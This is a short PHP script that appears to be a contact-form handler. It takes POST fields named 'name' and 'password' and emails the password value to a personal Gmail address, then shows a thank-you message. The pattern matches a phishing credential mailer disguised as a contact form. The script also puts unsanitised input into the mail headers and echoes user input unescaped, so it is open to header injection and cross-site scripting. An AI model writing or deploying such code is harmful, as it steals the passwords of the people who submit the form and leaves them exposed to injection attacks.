<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $name = $_POST["rname"];
    $email = $_POST["name"];
    $message = $_POST["password"];

    $to = "m0902290661@gmail.com";
    $subject = "New Contact Form Submission";
    $headers = "From: $email";

    mail($to, $subject, $message, $headers);

    echo "Email sent successfully. Thank you, $name!";
} else {
    echo "Invalid request.";
}
?>
